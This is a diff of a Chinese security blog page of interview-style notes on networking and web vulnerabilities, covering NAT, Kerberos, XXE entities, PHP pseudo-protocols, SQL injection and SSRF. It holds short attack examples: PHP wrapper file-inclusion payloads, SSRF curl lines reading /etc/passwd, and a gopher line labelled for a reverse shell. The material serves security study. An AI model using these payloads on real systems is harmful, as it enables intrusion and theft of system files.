+端口多路复用（Port address Translation,PAT）是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation）. 采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部 IP 地址实现对 Internet 的访问，从而可以最大限度地节约 IP 地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 internet 的攻击。因此，网络中应用最多的就是端口多路复用方式。例如，假设有两个内部主机 A 和 B，它们都使用私有 IP 地址 192.  168.1.1 和 192.  168.1.2，并且它们都要访问外部网络。路由器使用公网 IP 地址 203.0.113.1，并且已经配置了 PAT。当主机 A 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10000，并将数据包发送到外部网络。当主机 B 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10001，并将数据包发送到外部网络。当外部网络返回数据包时，路由器会根据目标端口号将数据包转发到相应的内部主机。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;hids&lt;br /&gt;
 HIDS（主机入侵检测系统）是一种监视计算机或网络中可疑活动的应用程序。监视的活动可以包括外部参与者创建的入侵，也可以包括内部资源或数据的滥用。HIDS 具有监视和分析计算系统内部方面以及其网络接口上的任何传入 / 传出网络数据包的能力。它通过监视操作系统操作、跟踪用户行为并在没有人类干预的情况下独立运行来检测主机上的恶意行为。&lt;br /&gt;
 HIDS 则通过监测主机系统的系统日志、进程状态、文件变化等信息来检测安全事件，主要关注应用层和操作系统层的信息&lt;/p&gt;
-&lt;p&gt;11.DOM 型 XSS 和反射型 XSS 的区别&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DOM 型 XSS 和反射型 XSS 的区别&lt;br /&gt;
  DOM 型 XSS 和反射型 XSS 的区别在于，DOM 型 XSS 不经过服务器，仅通过网页本身的 JavaScript 进行渲染触发，而反射型 XSS 是通过 URL 传递参数，服务器返回响应时，将参数中的恶意脚本代码反射回浏览器执行。DOM 型 XSS 的典型例子是在网页中插入一段恶意脚本代码，然后通过网页本身的 JavaScript 进行渲染触发。反射型 XSS 的典型例子是攻击者构造一个带有恶意脚本代码的 URL，然后将这个 URL 发送给受害者，当受害者点击这个 URL 时，恶意脚本代码就会被执行。&lt;/p&gt;
-&lt;ol start=&#34;12&#34;&gt;
-&lt;li&gt;内网 ip 和外网 ip 的区别&lt;br /&gt;
-一般来说，10 开头的 IP 都是内网 IP，即 10.0.0.0 到 10.255.255.255 是内网 IP。而以下 IP 段的地址都是内网 IP 地址：172.16.0.0 到 172.31.255.255、192.168.0.0 到 192.168.255.255、169.254.x.x（其中 x.x 为任意数字）。如果您想判断一个 ip 是公网 IP 还是私网 ip，可以登录百度，搜索 IP 得到一个本机的外网 IP。然后打开路由器（确切的说是网关，网关可能是光猫也可能是路由器），然后登陆进入查看 WAN IP，这个是路由器连接上层网络的 IP。若 WAN IP 和百度查到的外网 IP 一致，那么这个就是公网 ip 了。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;13.Kerboeros 协议&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;内网 ip 和外网 ip 的区别&lt;br /&gt;
+一般来说，10 开头的 IP 都是内网 IP，即 10.0.0.0 到 10.255.255.255 是内网 IP。而以下 IP 段的地址都是内网 IP 地址：172.  16.0.0 到 172.  31.255.255、192.  168.0.0 到 192.  168.255.255、169.254.x.x（其中 x.x 为任意数字）。如果您想判断一个 ip 是公网 IP 还是私网 ip，可以登录百度，搜索 IP 得到一个本机的外网 IP。然后打开路由器（确切的说是网关，网关可能是光猫也可能是路由器），然后登陆进入查看 WAN IP，这个是路由器连接上层网络的 IP。若 WAN IP 和百度查到的外网 IP 一致，那么这个就是公网 ip 了。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Kerboeros 协议&lt;br /&gt;
  Kerberos 协议是一种网络认证协议，用于在计算机网络上进行身份验证。它提供了一种安全的身份验证机制，以防止未经授权的访问。&lt;br /&gt;
 Kerberos 协议的基本原理是：用户向 Kerberos 服务器请求一个票据，该票据用于向其他服务器证明用户的身份。Kerberos 服务器使用用户的密码来生成票据，并将其发送回用户。用户可以使用该票据来访问其他服务器，而无需再次输入密码。&lt;br /&gt;
 通过过滤出 kerboros 流量，我们在 req-body 字段中，可以找到 clientName 的值，表示的就是 pc 的用户名，serverName 的两个字段一个表示服务用户名，一个是就是域名。&lt;/p&gt;
-&lt;p&gt;14.DHCP&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DHCP&lt;br /&gt;
 DHCP 协议是一种网络协议，用于在 TCP/IP 网络上分配 IP 地址。DHCP 代表动态主机配置协议。DHCP 协议允许计算机在网络上自动获取 IP 地址，而无需手动配置。DHCP 还提供了其他信息，例如子网掩码、默认网关和 DNS 服务器的地址。DHCP 服务器是负责分配 IP 地址的服务器。DHCP 客户端是需要 IP 地址的计算机。可以帮助识别连接到网络的计算机的主机名、MAC 地址和 IP 地址。在 hostname 字段中可以找到主机名，在 clientMac 字段中可以找到主机的 mac 地址，这样我们就能把主机 - 主机 mac 地址 - IP 地址给关联起来，可以描述出网络中的主机拓扑结构。&lt;/p&gt;
-&lt;p&gt;15.dict 协议&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;dict 协议&lt;br /&gt;
  Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。Dict 服务器和客户机使用 TCP 端口 2628。Dict 协议是基于查询响应的 TCP 协议，它的目标是超越 Webster protocol，并允许客户端在使用过程中访问更多字典 12.&lt;/p&gt;
-&lt;p&gt;16.redis 服务&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;redis 服务&lt;br /&gt;
  Redis 是一个使用 ANSI C 编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。它是一种 NoSQL 数据库，具有高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。Redis 支持分布式，理论上可以无限扩展，是现在最受欢迎的 NoSQL 数据库之一。&lt;/p&gt;
-&lt;p&gt;17.gopher 协议&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;gopher 协议&lt;br /&gt;
  gopher 协议是一个古老且强大的协议，可以理解为是 http 协议的前身，他可以实现多个数据包整合发送。通过 gopher 协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。&lt;/p&gt;
-&lt;p&gt;18.xml 文件&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;xml 文件&lt;br /&gt;
  XML 是一种用来传输和存储数据的可扩展标记语言。它由三部分组成：XML 文档声明，在文档的第一行；XML 文档类型定义，即 DTD，XXE 漏洞所在的地方；XML 文档元素。&lt;br /&gt;
 XML 的 DTD 实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。&lt;br /&gt;
 内部实体：&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE test [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY writer &amp;quot;Bill Gates&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY copyright &amp;quot;Copyright W3School.com.cn&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
 &lt;p&gt;外部实体：&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE test [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY writer SYSTEM &amp;quot;http://www.w3school.com.cn/dtd/entities.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY copyright SYSTEM &amp;quot;http://www.w3school.com.cn/dtd/entities.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;author&amp;gt;&amp;amp;writer;&amp;amp;copyright;&amp;lt;/author&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;ol start=&#34;19&#34;&gt;
@@ -610,17 +754,31 @@ MIME 消息能包含文本、图像、音频、视频以及其他应用程序专
 MIME 通用结构为：&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type/subtype&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;21.NTFS 数据流&lt;br /&gt;
+&lt;li&gt;
+&lt;p&gt;NTFS 数据流&lt;br /&gt;
  NTFS 数据流文件，也叫 Alternate data streams，简称 ADS，是 NTFS 文件系统的一个特性之一，允许单独的数据流文件存在，同时也允许一个文件附着多个数据流，即除了主文件流之外还允许许多非主文件流寄生在主文件流之中，它使用资源派生的方式来维持与文件相关信息，并且这些寄生的数据流文件我们使用资源管理器是看不到的。&lt;/p&gt;
-&lt;p&gt;22.tomcat ajp 协议&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;tomcat ajp 协议&lt;br /&gt;
  Apache Tomcat 支持 AJP 协议，用来通过反向代理到 Tomcat 的请求和相关的数据，AJP 协议的作用是，当一个请求包含请求主体时，一个未经允许的、包含请求主体首部分（或可能所有的）的 AJP 消息被发送到 Tomcat。在某些情况下，Tomcat 会把这个消息当作一个新的请求来处理，而不会当作请求主体。&lt;/p&gt;
-&lt;p&gt;23.IIS&lt;br /&gt;
-IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组件，专业的说，IIS 可以赋予一部主机电脑一组以上的 IP 地址，而且还可以有一个以上的域名作为 Web 网站。简单来说：Internet Information Service（IIS）是 windows 开设 web 网页服务的组件，用来搭载网站运行程序的平台的。还能提供 FTP，SMTP 等服务。&lt;br /&gt;
-24.PHP 伪协议&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;IIS&lt;br /&gt;
+IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组件，专业的说，IIS 可以赋予一部主机电脑一组以上的 IP 地址，而且还可以有一个以上的域名作为 Web 网站。简单来说：Internet Information Service（IIS）是 windows 开设 web 网页服务的组件，用来搭载网站运行程序的平台的。还能提供 FTP，SMTP 等服务。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;PHP 伪协议&lt;br /&gt;
  PHP 伪协议指的是 PHP 所支持的协议与封装协议，在 web 渗透漏洞利用中常用于配合文件包含进行 web 攻击，从而获取网站权限。&lt;br /&gt;
 常用伪协议与方法如下所示：&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file://     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=off&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=file://C:phpinfo.txt  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用于访问本地文件系统 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php://filter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=off&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=php://filter/read=convert.base64-encode/resource=./index.php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用于读取 php 文件源码内容 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php://input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=php://input, post 数据：&amp;lt;?php phpinfo ();?&amp;gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip://&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=off/on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=zip://file.zip%23phpinfo.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 访问压缩文件中的子文件，子文件可修改为任意后缀依然会被当作 php 执行 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data://&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=on     allow_url_include=on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=data:test/plain;&amp;lt;?php phpinfo ();?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 传递相应格式的数据来执行 php 代码 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;sqlmap 扫 https 时，如果未经处理则会报错，因为 sqlmap 不能自动伪造证书。通常有两种办法处理：添加 --force-ssl 参数； 走本地代理端口访问。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;指纹是组件上能标识对象类型的一段特征信息，用来在渗透测试信息收集环节中快速识别目标服务。对于你所渗透目标的操作系统、数据库、服务、开发语言、框架、中间件、CMS 等都包含了一些特征信息来标识它。通过发现这些特征信息并对它进行识别可以帮助我们快速地制定渗透策略，是渗透环节中关键的一步。常见的识别方式：源码特征信息提取；响应包 header 或者 body 特征信息提取；静态文件内容特征提取；静态文件 MD5 值匹配；根据请求协议识别；基于 URL 关键字识别。常用工具：whatweb (kali)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h1 id=&#34;常见漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见漏洞&#34;&gt;#&lt;/a&gt; 常见漏洞&lt;/h1&gt;
 &lt;h2 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h2&gt;
 &lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
@@ -636,8 +794,8 @@ IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组
 &lt;li&gt;输入验证：对用户输入进行验证，只允许输入预期的数据类型和长度。（正则过滤）&lt;/li&gt;
 &lt;li&gt;参数化查询：使用参数化查询可以防止 SQL 注入攻击。参数化查询是指将 SQL 语句和参数分开处理，参数不会被解释为 SQL 语句的一部分。（php 转义、预编译）&lt;/li&gt;
 &lt;li&gt;最小权限原则：数据库用户应该只被授予最小权限，以限制攻击者能够访问的数据。&lt;/li&gt;
-&lt;li&gt;防火墙：使用防火墙可以限制对数据库的访问，只允许来自特定 IP 地址或端口的请求。&lt;br /&gt;
-5.waf 设备&lt;/li&gt;
+&lt;li&gt;防火墙：使用防火墙可以限制对数据库的访问，只允许来自特定 IP 地址或端口的请求。&lt;/li&gt;
+&lt;li&gt;waf 设备&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
 &lt;h4 id=&#34;关键字过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字过滤&#34;&gt;#&lt;/a&gt; 关键字过滤&lt;/h4&gt;
@@ -677,10 +835,12 @@ IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组
 &lt;li&gt;慢查询日志写入 shell（仅有在查询时间超过系统设定时间时才会写入 shell）&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;mysql-无法写-shell-的原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-无法写-shell-的原因&#34;&gt;#&lt;/a&gt; MySQL 无法写 shell 的原因&lt;/h3&gt;
-&lt;p&gt;1.My.ini 配置 secure-file-priv 为空或 / 则可以导出导入无限制&lt;br /&gt;
- 2. 绝对路径不正确&lt;br /&gt;
- 3. 没有读写权限&lt;br /&gt;
- 4. 没有开启全局日志或慢查询日志&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;My.ini 配置 secure-file-priv 为空或 / 则可以导出导入无限制&lt;/li&gt;
+&lt;li&gt;绝对路径不正确&lt;/li&gt;
+&lt;li&gt;没有读写权限&lt;/li&gt;
+&lt;li&gt;没有开启全局日志或慢查询日志&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
 &lt;h3 id=&#34;原理-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-2&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
 &lt;p&gt;服务器请求伪造，服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，服务器就以服务器自己的身份去访问其他服务器的资源。&lt;/p&gt;
@@ -695,26 +855,37 @@ IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组
 &lt;li&gt;从 URL 关键字中寻找，Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;方法-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-2&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
-&lt;p&gt;1.dict 协议，泄露安装软件版本信息，查看端口，操作内网 redis 服务等：dict://serverip:port / 命令：参数&lt;br /&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;dict 协议，泄露安装软件版本信息，查看端口，操作内网 redis 服务等：dict://serverip:port / 命令：参数&lt;br /&gt;
  &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&amp;#x27; // 利用 dict 探测端口 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;2.file 协议，在有回显的情况下，利用 file 协议可以读取任意内容&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;file 协议，在有回显的情况下，利用 file 协议可以读取任意内容&lt;br /&gt;
  &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=file:///etc/passwd&amp;#x27; // 利用 file 协议查看文件 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;3.gopher 协议，gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;gopher 协议，gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&amp;#x27; // 利用 gopher 反弹 shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;4.http/s 协议，探测内网主机存活&lt;/p&gt;
-&lt;h3 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h3&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;http/s 协议，探测内网主机存活&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h3 id=&#34;绕过-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-2&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;采用短网址绕过&lt;/li&gt;
 &lt;li&gt;对 ip 地址进行进制转换&lt;/li&gt;
 &lt;li&gt;利用特殊域名，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuaW8=&#34;&gt;example.io&lt;/span&gt; 可以指向任意域名，则 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS5leGFtcGxlLmlv&#34;&gt;127.0.0.1.example.io&lt;/span&gt; 最终会被解析为 127.0.0.1&lt;/li&gt;
 &lt;li&gt;利用 [::]，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMQ==&#34;&gt;http://127.0.0.1&lt;/span&gt; &amp;gt;&amp;gt; http://[::127.0.0.1]&lt;/li&gt;
-&lt;li&gt;利用句号，比如 127.0.0.1  &amp;gt;&amp;gt; 127。0。0。1&lt;br /&gt;
-6.CRLF 编码绕过&lt;/li&gt;
+&lt;li&gt;利用句号，比如 127.0.0.1  &amp;gt;&amp;gt; 127。0。0。1&lt;/li&gt;
+&lt;li&gt;CRLF 编码绕过&lt;/li&gt;
 &lt;li&gt;使用封闭的字母和数字&lt;/li&gt;
 &lt;li&gt;当限制只能使用 http 协议时，可以采取 302 跳转或短地址&lt;/li&gt;
